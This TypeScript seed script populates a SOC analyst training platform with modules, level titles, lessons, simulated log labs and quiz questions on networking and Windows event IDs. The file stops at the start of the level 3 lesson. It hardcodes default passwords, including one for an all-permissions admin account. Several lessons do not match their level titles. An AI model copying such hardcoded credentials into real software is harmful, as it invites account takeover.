import { db } from '../config/db.js';
import bcrypt from 'bcryptjs';

export function seedInitialData() {
  const userCount = db.prepare('SELECT COUNT(*) as count FROM users').get() as { count: number };
  if (userCount && userCount.count > 0) {
    return; // Already seeded
  }

  console.log('🌱 Seeding LMCYS database with curriculum, labs, alerts, logs, and default accounts...');

  const passwordHash = bcrypt.hashSync('Password@123', 10);
  const adminHash = bcrypt.hashSync('Admin@12345', 10);

  // Insert default roles
  db.prepare(`INSERT INTO roles (id, name, permissions) VALUES 
    ('role-student', 'student', '["read_levels", "submit_assessments", "submit_labs", "submit_reports", "view_certificates"]'),
    ('role-admin', 'admin', '["all"]')
  `).run();

  // Insert Admin User
  db.prepare(`INSERT INTO users (id, full_name, username, email, password_hash, role, xp, current_level, streak_days, soc_readiness, mindset_completed) VALUES
    ('usr-admin-01', 'SOC Administrator', 'admin', 'admin@lmcys.cyber', ?, 'admin', 5000, 100, 15, 100.0, 1)
  `).run(adminHash);

  // Insert 10 Modules
  const modules = [
    { id: 1, order_index: 1, title: 'Module 1 — Networking Fundamentals', slug: 'networking-fundamentals', description: 'OSI, TCP/IP, Ports, DNS, DHCP, Subnetting, and Packet Analysis', icon: 'Network', zone_name: 'Network Zone', level_start: 1, level_end: 10 },
    { id: 2, order_index: 2, title: 'Module 2 — Windows Fundamentals', slug: 'windows-fundamentals', description: 'Windows Architecture, Registry, Event Viewer, Security Logs, and Event IDs', icon: 'Cpu', zone_name: 'Windows Zone', level_start: 11, level_end: 20 },
    { id: 3, order_index: 3, title: 'Module 3 — Linux Fundamentals', slug: 'linux-fundamentals', description: 'Linux Architecture, Permissions, SSH, auth.log, Services, and Bash Investigation', icon: 'Terminal', zone_name: 'Linux Zone', level_start: 21, level_end: 28 },
    { id: 4, order_index: 4, title: 'Module 4 — Cybersecurity Fundamentals', slug: 'cybersecurity-fundamentals', description: 'CIA Triad, Threats, Vulnerabilities, Exploit Lifecycle, IOCs, and MITRE ATT&CK', icon: 'Shield', zone_name: 'Security Zone', level_start: 29, level_end: 38 },
    { id: 5, order_index: 5, title: 'Module 5 — SOC Fundamentals', slug: 'soc-fundamentals', description: 'SOC Tier Roles (L1/L2/L3), Events vs Alerts vs Incidents, Severity & Triage Workflow', icon: 'Radio', zone_name: 'SOC Command Center', level_start: 39, level_end: 48 },
    { id: 6, order_index: 6, title: 'Module 6 — SIEM & Log Telemetry', slug: 'siem-and-telemetry', description: 'Log Ingestion, Normalization, Correlation Rules, Querying, and Wazuh/Splunk Concepts', icon: 'Database', zone_name: 'SIEM Center', level_start: 49, level_end: 60 },
    { id: 7, order_index: 7, title: 'Module 7 — Detection & Investigation', slug: 'detection-and-investigation', description: 'Brute-force, Suspicious PowerShell, Port Scans, Lateral Movement, and DNS Tunneling', icon: 'Search', zone_name: 'Investigation Center', level_start: 61, level_end: 72 },
    { id: 8, order_index: 8, title: 'Module 8 — EDR & Endpoint Security', slug: 'edr-and-endpoint-security', description: 'Process Trees, Parent-Child Anomalies, Network Telemetry, and Host Isolation', icon: 'Activity', zone_name: 'EDR Sector', level_start: 73, level_end: 80 },
    { id: 9, order_index: 9, title: 'Module 9 — Incident Response Lifecycle', slug: 'incident-response-lifecycle', description: 'NIST/SANS 6 Phases, Containment, Eradication, Root Cause 5-Whys, and Reporting', icon: 'Flame', zone_name: 'Incident Response Center', level_start: 81, level_end: 90 },
    { id: 10, order_index: 10, title: 'Module 10 — SOC L1 Final Simulation Arena', slug: 'soc-l1-final-simulation', description: 'Live Multi-Stage Cyber Scenarios, Synthetic SIEM Log Triaging, TP/FP Deciders, and Report Grading', icon: 'Crosshair', zone_name: 'SOC Battle Arena', level_start: 91, level_end: 100 },
  ];

  const insertModule = db.prepare(`INSERT INTO modules (id, order_index, title, slug, description, icon, zone_name, level_start, level_end) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)`);
  modules.forEach(m => insertModule.run(m.id, m.order_index, m.title, m.slug, m.description, m.icon, m.zone_name, m.level_start, m.level_end));

  // Insert 100 Levels Metadata
  const levelTitles: { [key: number]: { title: string; summary: string; moduleId: number; difficulty: string } } = {
    1: { title: 'OSI Model & Packet Encapsulation', summary: 'Understand the 7 layers of OSI and how data flows through protocols.', moduleId: 1, difficulty: 'Beginner' },
    2: { title: 'TCP vs UDP & Port Triage', summary: 'Master connection-oriented vs connectionless traffic and common attacker ports.', moduleId: 1, difficulty: 'Beginner' },
    3: { title: 'DNS, DHCP & Resolution Hijacking', summary: 'Learn how name resolution works and how attackers manipulate domain requests.', moduleId: 1, difficulty: 'Beginner' },
    4: { title: 'IP Addressing, Subnetting & CIDR', summary: 'Analyze IPv4 prefixes, broadcast domains, and private RFC 1918 ranges.', moduleId: 1, difficulty: 'Beginner' },
    5: { title: 'MAC Address, ARP & ARP Poisoning', summary: 'Layer 2 communication mechanics and man-in-the-middle detection.', moduleId: 1, difficulty: 'Intermediate' },
    6: { title: 'HTTP/HTTPS, TLS & Web Handshakes', summary: 'Dissect SSL certificates, HTTP response codes, and web traffic.', moduleId: 1, difficulty: 'Intermediate' },
    7: { title: 'Routing Basics & NAT Gateway Analysis', summary: 'Trace packets across subnets and examine Network Address Translation.', moduleId: 1, difficulty: 'Intermediate' },
    8: { title: 'Network Firewalls & ACL Rule Triage', summary: 'Stateful vs stateless firewall inspection and drop log triage.', moduleId: 1, difficulty: 'Intermediate' },
    9: { title: 'Packet Capture Basics (PCAP & Wireshark)', summary: 'Analyze raw pcap streams and identify suspicious payload anomalies.', moduleId: 1, difficulty: 'Intermediate' },
    10: { title: 'Networking Milestone Assessment', summary: 'Comprehensive capstone practical test for Networking fundamentals.', moduleId: 1, difficulty: 'Advanced' },

    11: { title: 'Windows Architecture & Subsystems', summary: 'Kernel mode vs User mode, HAL, and Windows execution architecture.', moduleId: 2, difficulty: 'Beginner' },
    12: { title: 'Processes, Threads & svchost Anatomy', summary: 'Identify legitimate vs rogue Windows process hierarchies.', moduleId: 2, difficulty: 'Beginner' },
    13: { title: 'Windows Services & Persistence Hunters', summary: 'Service Control Manager, sc.exe, and malicious service installations.', moduleId: 2, difficulty: 'Intermediate' },
    14: { title: 'Windows Registry & Run Key Anomalies', summary: 'HKLM, HKCU, and autorun registry hooks abused by threat actors.', moduleId: 2, difficulty: 'Intermediate' },
    15: { title: 'System32 & File System Permissions (NTFS)', summary: 'Critical system directories, DLL search order hijacking, and DACLs.', moduleId: 2, difficulty: 'Intermediate' },
    16: { title: 'PowerShell Security & Execution Policies', summary: 'Script block logging, Constrained Language Mode, and obfuscation.', moduleId: 2, difficulty: 'Intermediate' },
    17: { title: 'Windows Event Viewer & Log Channels', summary: 'Security, System, and Application EVTX channel structures.', moduleId: 2, difficulty: 'Beginner' },
    18: { title: 'Event ID 4625 & 4624 Authentication Triage', summary: 'Hunt failed login spikes (Sub-status 0xC000006A) vs valid logons.', moduleId: 2, difficulty: 'Intermediate' },
    19: { title: 'Event ID 4688 & Process Creation Telemetry', summary: 'Command-line auditing and parent PID tracking in Windows logs.', moduleId: 2, difficulty: 'Intermediate' },
    20: { title: 'Windows Security Milestone Lab', summary: 'Hands-on triage of a Windows domain controller compromised by credential stuffing.', moduleId: 2, difficulty: 'Advanced' },

    21: { title: 'Linux Filesystem Hierarchy (FHS)', summary: '/etc, /var/log, /proc, /dev, and root permissions.', moduleId: 3, difficulty: 'Beginner' },
    22: { title: 'Linux User, Group & File Permissions (chmod/chown)', summary: 'Read, write, execute permissions and SUID/SGID bit risks.', moduleId: 3, difficulty: 'Beginner' },
    23: { title: 'Linux Process Management & Systemd Services', summary: 'ps, top, systemctl, and tracking orphan/zombie processes.', moduleId: 3, difficulty: 'Intermediate' },
    24: { title: 'SSH Authentication & Secure Hardening', summary: 'Public key auth, known_hosts, and brute-force lockouts.', moduleId: 3, difficulty: 'Intermediate' },
    25: { title: 'Linux auth.log & secure Log Analysis', summary: 'Triage Failed password for invalid user events in /var/log/auth.log.', moduleId: 3, difficulty: 'Intermediate' },
    26: { title: 'Crontab & Sudoers Privilege Escalation', summary: 'Inspect malicious cronjobs and sudo without password entries.', moduleId: 3, difficulty: 'Intermediate' },
    27: { title: 'Bash Command Line Forensics & History', summary: 'Grepping logs, unmasking hidden history, and finding web shells.', moduleId: 3, difficulty: 'Intermediate' },
    28: { title: 'Linux Security Milestone Assessment', summary: 'Investigate an unauthorized SSH backdoor on an Ubuntu production node.', moduleId: 3, difficulty: 'Advanced' },

    29: { title: 'The CIA Triad & Core Principles', summary: 'Confidentiality, Integrity, and Availability balance in real operations.', moduleId: 4, difficulty: 'Beginner' },
    30: { title: 'Threats, Vulnerabilities & Risk Scoring (CVSS)', summary: 'Qualitative vs Quantitative risk and Common Vulnerability Scoring.', moduleId: 4, difficulty: 'Beginner' },
    31: { title: 'Exploit Lifecycle & Weaponization', summary: 'From zero-day vulnerability to proof-of-concept payload execution.', moduleId: 4, difficulty: 'Beginner' },
    32: { title: 'Malware Types: Ransomware, Trojans & Worms', summary: 'Distinguish malware behaviors and destructive delivery vectors.', moduleId: 4, difficulty: 'Intermediate' },
    33: { title: 'Phishing Mechanics & Email Header Triage', summary: 'SPF, DKIM, DMARC, and malicious attachment analysis.', moduleId: 4, difficulty: 'Intermediate' },
    34: { title: 'Brute Force & Credential Stuffing', summary: 'Automated dictionary attacks, password spraying, and throttling.', moduleId: 4, difficulty: 'Intermediate' },
    35: { title: 'Indicators of Compromise (IOC) Taxonomy', summary: 'IPs, domain hashes (MD5/SHA256), registry keys, and file paths.', moduleId: 4, difficulty: 'Intermediate' },
    36: { title: 'Tactics, Techniques & Procedures (TTPs)', summary: 'David Bianco’s Pyramid of Pain and attacker behavior mapping.', moduleId: 4, difficulty: 'Intermediate' },
    37: { title: 'MITRE ATT&CK Matrix Navigation', summary: 'Enterprise matrix, Initial Access to Exfiltration mapping.', moduleId: 4, difficulty: 'Advanced' },
    38: { title: 'Cybersecurity Core Milestone Assessment', summary: 'Scenario-based evaluation across IOC identification and ATT&CK alignment.', moduleId: 4, difficulty: 'Advanced' },

    39: { title: 'What is a Security Operations Center (SOC)?', summary: 'SOC mission, people, processes, and technology overview.', moduleId: 5, difficulty: 'Beginner' },
    40: { title: 'SOC Tier Roles: L1 Analyst vs L2 vs L3', summary: 'Day in the life of a SOC L1: Triage, escalation, and SLAs.', moduleId: 5, difficulty: 'Beginner' },
    41: { title: 'Events vs Logs vs Alerts vs Incidents', summary: 'Learn the strict hierarchy from raw syslog telemetry to critical incident.', moduleId: 5, difficulty: 'Beginner' },
    42: { title: 'Severity vs Priority Matrix', summary: 'Calculate impact vs urgency to assign P1 (Critical) to P4 (Low).', moduleId: 5, difficulty: 'Intermediate' },
    43: { title: 'SOC Triage Workflow & Playbooks', summary: 'Step-by-step Standard Operating Procedures (SOPs) for incoming alerts.', moduleId: 5, difficulty: 'Intermediate' },
    44: { title: 'True Positive vs False Positive Fundamentals', summary: 'Differentiate real adversarial activity from benign scanner noise.', moduleId: 5, difficulty: 'Intermediate' },
    45: { title: 'Alert Escalation & Hand-off Protocols', summary: 'When and how to escalate from Tier 1 to Incident Response Tier 2.', moduleId: 5, difficulty: 'Intermediate' },
    46: { title: 'SOC Metrics: MTTD, MTTR & SLA Compliance', summary: 'Mean Time to Detect, Mean Time to Respond, and operational KPIs.', moduleId: 5, difficulty: 'Intermediate' },
    47: { title: 'Communication Protocols During P1 Incidents', summary: 'Stakeholder briefing, chain of custody, and crisis notifications.', moduleId: 5, difficulty: 'Intermediate' },
    48: { title: 'SOC Fundamentals Milestone Assessment', summary: 'Simulated alert triage drill with SLA countdown and priority grading.', moduleId: 5, difficulty: 'Advanced' },

    49: { title: 'What is SIEM Architecture?', summary: 'Log collectors, indexers, storage tiers, and forwarders.', moduleId: 6, difficulty: 'Beginner' },
    50: { title: 'Log Collection & Ingestion Protocols (Syslog/WEF)', summary: 'UDP 514, Windows Event Forwarding, Beats, and agents.', moduleId: 6, difficulty: 'Intermediate' },
    51: { title: 'Log Sources: Network, Host, Cloud & Apps', summary: 'Multi-source telemetry map required for 360-degree visibility.', moduleId: 6, difficulty: 'Intermediate' },
    52: { title: 'Log Parsing & Regex Field Extraction', summary: 'Turning unformatted text strings into structured key-value pairs.', moduleId: 6, difficulty: 'Intermediate' },
    53: { title: 'Log Normalization & Schema Standards (ECS)', summary: 'Elastic Common Schema and standardizing src_ip / dst_port.', moduleId: 6, difficulty: 'Intermediate' },
    54: { title: 'SIEM Correlation Rules & Logic Writing', summary: 'Building rules: "5 failed logins within 60s followed by 1 success".', moduleId: 6, difficulty: 'Intermediate' },
    55: { title: 'SIEM Alert Tuning & Noise Reduction', summary: 'Suppressing recurring false alarms without creating blind spots.', moduleId: 6, difficulty: 'Intermediate' },
    56: { title: 'Building SOC Dashboards & Visualizations', summary: 'Time-series graphs, top talkers, geo-IP maps, and heatmaps.', moduleId: 6, difficulty: 'Intermediate' },
    57: { title: 'Search Query Syntax (KQL & SPL Basics)', summary: 'Searching logs using boolean filters, aggregations, and wildcards.', moduleId: 6, difficulty: 'Advanced' },
    58: { title: 'Wazuh Open-Source SIEM Architecture', summary: 'Manager, indexer, dashboard, and agent rule decoders.', moduleId: 6, difficulty: 'Advanced' },
    59: { title: 'SIEM Threat Hunting Workflows', summary: 'Proactive hypothesis-driven queries across historical telemetry.', moduleId: 6, difficulty: 'Advanced' },
    60: { title: 'SIEM Mastery Capstone Lab', summary: 'Investigate an active compromise using live synthetic SIEM queries.', moduleId: 6, difficulty: 'Advanced' },
  };

  // Generate for 61-100 programmatically with realistic curriculum
  for (let i = 61; i <= 100; i++) {
    let modId = 7;
    let diff = 'Intermediate';
    let title = `SOC Practical Topic ${i}`;
    let summary = `Specialized detection, investigation, and incident response drill for level ${i}.`;

    if (i <= 72) {
      modId = 7; // Detection & Investigation
      diff = i % 2 === 0 ? 'Advanced' : 'Intermediate';
      const topics7 = [
        'Brute-Force & Password Spray Detection', 'Port Scanning & Reconnaissance Analysis',
        'Suspicious PowerShell & Encoded Commands', 'Suspicious Process Execution & LOLBAS',
        'Malware Execution & Dropper Analysis', 'Account Compromise & Impossible Travel',
        'Privilege Escalation Hunting', 'Persistence Mechanism Detection',
        'Lateral Movement via SMB & WinRM', 'Suspicious DNS Queries & Tunneling',
        'Data Exfiltration via Web Uploads', 'Detection Engineering Milestone'
      ];
      title = topics7[i - 61];
      summary = `Deep dive detection techniques for ${title}.`;
    } else if (i <= 80) {
      modId = 8; // EDR
      diff = 'Advanced';
      const topics8 = [
        'What is EDR & Endpoint Telemetry', 'Analyzing Parent-Child Process Trees',
        'Suspicious File Activity & Ransomware Indicators', 'Network Connections from Non-Browser Binaries',
        'Memory Injection & Cobalt Strike Beacons', 'Endpoint Isolation Protocols',
        'Host Containment & Forensic Artifact Collection', 'EDR Deep Telemetry Milestone'
      ];
      title = topics8[i - 73];
      summary = `Hands-on EDR telemetry, process graph analysis, and isolation playbooks.`;
    } else if (i <= 90) {
      modId = 9; // Incident Response
      diff = 'Advanced';
      const topics9 = [
        'NIST SP 800-61 Incident Response Phases', 'Phase 1: Identification & Scoping',
        'Phase 2: Deep Evidence Collection', 'Phase 3: Containment Strategies',
        'Phase 4: Eradication of Threat Persistence', 'Phase 5: Recovery & Secure Restoration',
        'Reconstructing the Attack Timeline', 'Root Cause Analysis: The 5 Whys Method',
        'Chain of Custody & Evidence Integrity', 'Incident Documentation & Executive Briefing'
      ];
      title = topics9[i - 81];
      summary = `Full incident response execution and forensic analysis workflows.`;
    } else {
      modId = 10; // Final Simulation
      diff = 'Expert';
      const topics10 = [
        'Scenario Alpha: Critical SSH Brute Force with Root Compromise',
        'Scenario Beta: Spear-Phishing with Macro-Enabled Malicious Dropper',
        'Scenario Gamma: Living-off-the-Land (LOLBAS) Certutil Download',
        'Scenario Delta: Active Directory Pass-the-Hash & Lateral Spread',
        'Scenario Epsilon: DNS Data Exfiltration & C2 Beaconing',
        'Scenario Zeta: Web Application SQL Injection & Database Dump',
        'Scenario Eta: Insider Threat Privilege Abuse & Data Theft',
        'Scenario Theta: Multi-Stage Ransomware Outbreak Simulation',
        'Scenario Iota: Complex APT Multi-Host Supply Chain Attack',
        'SOC L1 Final Practical Certification Arena (Grand Capstone)'
      ];
      title = topics10[i - 91];
      summary = `Live synthetic enterprise investigation scenario. Triage, decide TP/FP, and write the final incident report.`;
    }

    levelTitles[i] = { title, summary, moduleId: modId, difficulty: diff };
  }

  const insertLevel = db.prepare(`INSERT INTO levels (id, module_id, level_number, title, slug, summary, xp_reward, estimated_minutes, difficulty, is_locked_by_default) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`);

  for (let i = 1; i <= 100; i++) {
    const l = levelTitles[i];
    const slug = `level-${i}-${l.title.toLowerCase().replace(/[^a-z0-9]+/g, '-').replace(/(^-|-$)/g, '')}`;
    const isLocked = i === 1 ? 0 : 1;
    insertLevel.run(i, l.moduleId, i, l.title, slug, l.summary, 100 + (i * 10), 15 + Math.floor(i / 10) * 5, l.difficulty, isLocked);
  }

  // Insert Rich Content for Levels 1, 2, and 3
  const insertLesson = db.prepare(`INSERT INTO lessons (id, level_id, overview_md, key_takeaways_json, practical_brief_md, diagram_svg) VALUES (?, ?, ?, ?, ?, ?)`);
  const insertQuestion = db.prepare(`INSERT INTO questions (id, level_id, type, question_text, explanation, points, topic_tag) VALUES (?, ?, ?, ?, ?, ?, ?)`);
  const insertOption = db.prepare(`INSERT INTO question_options (id, question_id, option_text, is_correct, explanation) VALUES (?, ?, ?, ?, ?)`);
  const insertAssessment = db.prepare(`INSERT INTO assessments (id, level_id, passing_score, time_limit_seconds) VALUES (?, ?, ?, ?)`);
  const insertLab = db.prepare(`INSERT INTO practical_labs (id, level_id, title, scenario_md, lab_type, initial_state_json, validation_rules_json) VALUES (?, ?, ?, ?, ?, ?, ?)`);

  // --- LEVEL 1: Networking Fundamentals ---
  insertLesson.run(
    'lsn-1',
    1,
    `### Welcome to Level 01: OSI Model & Packet Encapsulation

As a **SOC Level 1 Analyst**, network telemetry will be your first line of defense. Every cyber attack leaves traces across network layers — from port scans to command-and-control (C2) beaconing.

#### The 7-Layer OSI Model Breakdown:
1. **Layer 7 — Application**: HTTP, HTTPS, DNS, SSH, FTP, SMTP (User-facing protocols)
2. **Layer 6 — Presentation**: Encryption, compression, SSL/TLS negotiation
3. **Layer 5 — Session**: Manages and terminates connections between applications
4. **Layer 4 — Transport**: **TCP** (Connection-oriented, 3-way handshake SYN -> SYN/ACK -> ACK) vs **UDP** (Connectionless, lightweight, fast)
5. **Layer 3 — Network**: Logical IP addressing (IPv4 / IPv6), ICMP, Routers
6. **Layer 2 — Data Link**: Physical MAC addressing, Switches, Frames, ARP
7. **Layer 1 — Physical**: Cables, fiber optics, bitstreams

#### Why This Matters to a SOC Analyst:
* An alert showing \`SYN Flood\` is an attack targeting Layer 4 (Transport Layer queue exhaustion).
* An alert showing \`DNS Tunneling\` is an exfiltration attempt masquerading inside Layer 7 application queries.
* Knowing packet encapsulation allows you to inspect packet headers and identify IP spoofing or anomalous port behaviors.`,
    JSON.stringify([
      'The OSI Model standardizes network communication into 7 distinct abstraction layers.',
      'TCP guarantees packet delivery with a 3-way handshake (SYN, SYN-ACK, ACK); UDP is stateless and fast.',
      'Layer 3 deals with IP addresses and routing; Layer 2 uses MAC addresses and switching.',
      'SOC Analysts use protocol headers to identify anomalies, spoofed IPs, and protocol misuse.'
    ]),
    `#### Practical Lab Mission:
You have intercepted a suspicious packet header captured by an edge network sensor. Use the terminal tools below to inspect the packet, identify the source/destination IPs, determine the transport protocol, and verify if the traffic is an attack or legitimate traffic.`,
    'network-osi'
  );

  insertLab.run(
    'lab-1',
    1,
    'Network Packet Header Inspector Lab',
    `**Mission Objective:**
1. Inspect the captured network flow.
2. Run \`inspect --flow\` to view the Layer 3/4 header.
3. Identify the destination port and protocol.
4. Run \`verify --port 443\` or \`verify --protocol tcp\` to submit findings.`,
    'packet',
    JSON.stringify({
      capturedPacket: {
        src_ip: '198.51.100.44',
        dst_ip: '10.0.4.15',
        src_port: 49152,
        dst_port: 443,
        protocol: 'TCP',
        flags: ['SYN'],
        payload_preview: 'TLS Client Hello (v1.3) Sni: corporate-gateway.internal'
      },
      availableCommands: ['help', 'inspect --flow', 'analyze --layer 4', 'check --reputation 198.51.100.44', 'verify --protocol tcp']
    }),
    JSON.stringify({
      requiredCommands: ['inspect --flow'],
      correctProtocol: 'TCP',
      correctPort: 443
    })
  );

  insertAssessment.run('asm-1', 1, 70, 600);

  // Questions for Level 1
  const q1_1 = 'q-1-1';
  insertQuestion.run(q1_1, 1, 'mcq', 'Which layer of the OSI model is responsible for routing packets based on logical IP addresses?', 'Layer 3 (Network Layer) handles logical routing and IP addressing across networks.', 25, 'OSI Model');
  insertOption.run('opt-1-1-1', q1_1, 'Layer 2 (Data Link)', 0, 'Layer 2 handles physical MAC addresses and frames.');
  insertOption.run('opt-1-1-2', q1_1, 'Layer 3 (Network)', 1, 'Correct! Layer 3 routes packets using IPv4 and IPv6 addresses.');
  insertOption.run('opt-1-1-3', q1_1, 'Layer 4 (Transport)', 0, 'Layer 4 handles end-to-end ports and connection states.');
  insertOption.run('opt-1-1-4', q1_1, 'Layer 7 (Application)', 0, 'Layer 7 interacts with user software applications.');

  const q1_2 = 'q-1-2';
  insertQuestion.run(q1_2, 1, 'mcq', 'What is the correct sequence of packets in a standard TCP Three-Way Handshake?', 'TCP connection establishment follows: Client sends SYN -> Server responds with SYN-ACK -> Client replies with ACK.', 25, 'TCP vs UDP');
  insertOption.run('opt-1-2-1', q1_2, 'ACK -> SYN -> SYN-ACK', 0, 'Incorrect sequence.');
  insertOption.run('opt-1-2-2', q1_2, 'SYN -> SYN-ACK -> ACK', 1, 'Correct! SYN (Synchronize), SYN-ACK (Synchronize-Acknowledge), ACK (Acknowledge).');
  insertOption.run('opt-1-2-3', q1_2, 'SYN -> ACK -> DATA', 0, 'Missing the server SYN-ACK step.');
  insertOption.run('opt-1-2-4', q1_2, 'FIN -> ACK -> SYN', 0, 'FIN is used to terminate a connection.');

  const q1_3 = 'q-1-3';
  insertQuestion.run(q1_3, 1, 'mcq', 'A SOC analyst observes anomalous high-volume UDP traffic on port 53. Which protocol is primarily associated with this port?', 'Port 53 is the standard port for Domain Name System (DNS) resolution.', 25, 'DNS');
  insertOption.run('opt-1-3-1', q1_3, 'DHCP (Dynamic Host Configuration Protocol)', 0, 'DHCP uses ports 67 and 68.');
  insertOption.run('opt-1-3-2', q1_3, 'HTTP (Hypertext Transfer Protocol)', 0, 'HTTP uses port 80.');
  insertOption.run('opt-1-3-3', q1_3, 'DNS (Domain Name System)', 1, 'Correct! DNS operates on UDP port 53 (and TCP 53 for zone transfers/large payloads).');
  insertOption.run('opt-1-3-4', q1_3, 'SSH (Secure Shell)', 0, 'SSH uses port 22.');

  const q1_4 = 'q-1-4';
  insertQuestion.run(q1_4, 1, 'mcq', 'Which of the following IPv4 address ranges is designated as a private RFC 1918 internal network?', 'RFC 1918 defines private non-routable address spaces: 10.0.0.0/8, 172.16.0.0/12, and 192.168.0.0/16.', 25, 'IP Addressing');
  insertOption.run('opt-1-4-1', q1_4, '8.8.8.0/24', 0, 'This is Google public DNS range.');
  insertOption.run('opt-1-4-2', q1_4, '10.0.0.0/8', 1, 'Correct! 10.0.0.0/8 is a standard private enterprise address range.');
  insertOption.run('opt-1-4-3', q1_4, '185.220.101.5/32', 0, 'This is a public IP address.');
  insertOption.run('opt-1-4-4', q1_4, '1.1.1.1/32', 0, 'This is Cloudflare public DNS.');

  // --- LEVEL 2: Windows Fundamentals & Security Logs ---
  insertLesson.run(
    'lsn-2',
    2,
    `### Welcome to Level 02: Windows Fundamentals & Security Event Logs

Over 85% of corporate endpoints run Windows OS. As a SOC analyst, analyzing Windows Security Event Logs (\`Security.evtx\`) is essential to detecting credential stuffing, unauthorized privileges, and living-off-the-land malware.

#### Critical Windows Event IDs Every SOC Analyst Must Memorize:
* **Event ID 4624**: Successful Account Logon (Check \`LogonType\`: 2=Interactive, 3=Network, 10=RemoteDesktop RDP).
* **Event ID 4625**: An account failed to log on (Look for Sub-Status codes: \`0xC000006A\` = Bad Password, \`0xC0000064\` = User Does Not Exist).
* **Event ID 4688**: A new process has been created (Check Process Name, Parent Process, and full command line parameters).
* **Event ID 4720**: A user account was created (Critical alert if created outside change windows).
* **Event ID 7045**: A new service was installed on the system (Frequent malware persistence technique).

#### Hunting Authentication Attacks:
When analyzing a brute force or password spray attack:
1. Filter for Event ID **4625**.
2. Group by **Source Network Address (IP)** and **Target Username**.
3. A cluster of dozens or hundreds of 4625 events within seconds followed by a single **4624** indicates a successful brute-force breach!`,
    JSON.stringify([
      'Event ID 4625 indicates a failed login; Event ID 4624 indicates a successful logon.',
      'Logon Type 3 is Network logon (SMB/RPC); Logon Type 10 is Remote Desktop (RDP).',
      'Event ID 4688 captures process creation and is vital for tracking PowerShell and LOLBAS execution.',
      'Event ID 7045 alerts to new service installations often used for persistence.'
    ]),
    `#### Practical Lab Mission:
Open the Windows Security Log Viewer simulator. Search for failed authentication events, detect the attacker's source IP, identify the targeted username, and determine if the breach succeeded.`,
    'windows-logs'
  );

  insertLab.run(
    'lab-2',
    2,
    'Windows Security Log Triage Lab',
    `**Mission Objective:**
1. Examine the simulated Windows Security Event log stream.
2. Execute \`evtx --filter 4625\` to isolate logon failures.
3. Check the TargetUserName and IpAddress.
4. Execute \`evtx --filter 4624\` to determine if any login succeeded from that same IP.`,
    'terminal',
    JSON.stringify({
      systemHostname: 'CORP-DC-01.contoso.local',
      logs: [
        { time: '2026-08-26 03:14:02', event_id: '4625', user: 'Administrator', src_ip: '185.220.101.7', sub_status: '0xC000006A', msg: 'Unknown user name or bad password' },
        { time: '2026-08-26 03:14:05', event_id: '4625', user: 'Administrator', src_ip: '185.220.101.7', sub_status: '0xC000006A', msg: 'Unknown user name or bad password' },
        { time: '2026-08-26 03:14:09', event_id: '4625', user: 'Administrator', src_ip: '185.220.101.7', sub_status: '0xC000006A', msg: 'Unknown user name or bad password' },
        { time: '2026-08-26 03:14:14', event_id: '4624', user: 'Administrator', src_ip: '185.220.101.7', logon_type: '10', msg: 'An account was successfully logged on via RDP' }
      ],
      commands: ['help', 'evtx --all', 'evtx --filter 4625', 'evtx --filter 4624', 'ioc --ip 185.220.101.7', 'verify --breach true']
    }),
    JSON.stringify({
      requiredFilters: ['4625', '4624'],
      verdict: 'Compromised'
    })
  );

  insertAssessment.run('asm-2', 2, 70, 600);

  // Questions for Level 2
  const q2_1 = 'q-2-1';
  insertQuestion.run(q2_1, 2, 'mcq', 'Which Windows Event ID explicitly indicates that a user account failed to log on?', 'Event ID 4625 in the Windows Security Log records all failed logon attempts with sub-status reason codes.', 25, 'Windows Security Logs');
  insertOption.run('opt-2-1-1', q2_1, 'Event ID 4624', 0, 'Event ID 4624 is for successful logon.');
  insertOption.run('opt-2-1-2', q2_1, 'Event ID 4625', 1, 'Correct! Event ID 4625 records failed logon attempts.');
  insertOption.run('opt-2-1-3', q2_1, 'Event ID 4688', 0, 'Event ID 4688 records new process creation.');
  insertOption.run('opt-2-1-4', q2_1, 'Event ID 7045', 0, 'Event ID 7045 records new service installation.');

  const q2_2 = 'q-2-2';
  insertQuestion.run(q2_2, 2, 'mcq', 'In a Windows Event ID 4624 log, what does a Logon Type value of "10" represent?', 'Logon Type 10 represents RemoteInteractive (Logon via Terminal Services, Remote Desktop / RDP).', 25, 'Event IDs');
  insertOption.run('opt-2-2-1', q2_2, 'Interactive (Local console logon sitting at keyboard)', 0, 'Interactive local console logon is Logon Type 2.');
  insertOption.run('opt-2-2-2', q2_2, 'Network (Connecting via SMB share or mapped drive)', 0, 'Network logon is Logon Type 3.');
  insertOption.run('opt-2-2-3', q2_2, 'RemoteInteractive (RDP / Remote Desktop)', 1, 'Correct! Logon Type 10 is Remote Desktop (RDP) login.');
  insertOption.run('opt-2-2-4', q2_2, 'Service (Starting a background daemon)', 0, 'Service logon is Logon Type 5.');

  const q2_3 = 'q-2-3';
  insertQuestion.run(q2_3, 2, 'mcq', 'A threat actor installs a persistence mechanism via a malicious Windows Service. Which Event ID alerts you to a new service being created?', 'Event ID 7045 (System log) is generated whenever a new service is installed on the host.', 25, 'Windows Security Logs');
  insertOption.run('opt-2-3-1', q2_3, 'Event ID 7045', 1, 'Correct! Event ID 7045 indicates a new service installation.');
  insertOption.run('opt-2-3-2', q2_3, 'Event ID 1102', 0, 'Event ID 1102 indicates audit log clearing.');
  insertOption.run('opt-2-3-3', q2_3, 'Event ID 4720', 0, 'Event ID 4720 is user account creation.');
  insertOption.run('opt-2-3-4', q2_3, 'Event ID 4634', 0, 'Event ID 4634 is an account logoff.');

  const q2_4 = 'q-2-4';
  insertQuestion.run(q2_4, 2, 'mcq', 'If an analyst sees 50 instances of Event ID 4625 from the same external IP within 60 seconds followed by an Event ID 4624, what attack type is occurring?', 'This pattern represents a brute-force or dictionary attack where the attacker guessed the password and successfully gained entry.', 25, 'Brute Force');
  insertOption.run('opt-2-4-1', q2_4, 'DDoS bandwidth saturation', 0, 'DDoS targets resource exhaustion, not credential guesses.');
  insertOption.run('opt-2-4-2', q2_4, 'Brute Force / Password Guessing Attack resulting in breach', 1, 'Correct! Multiple failed attempts followed by a successful login confirms a brute force compromise.');
  insertOption.run('opt-2-4-3', q2_4, 'Benign user forgetting password and giving up', 0, 'The presence of 4624 from an external IP indicates success, not giving up.');
  insertOption.run('opt-2-4-4', q2_4, 'DNS poisoning attack', 0, 'DNS poisoning does not generate Windows logon security events.');

  // --- LEVEL 3: SOC Fundamentals & Triage Workflow ---
  insertLesson.run(
    'lsn-3',
    3,
    `### Welcome to Level 03: SOC Fundamentals & Alert Triage

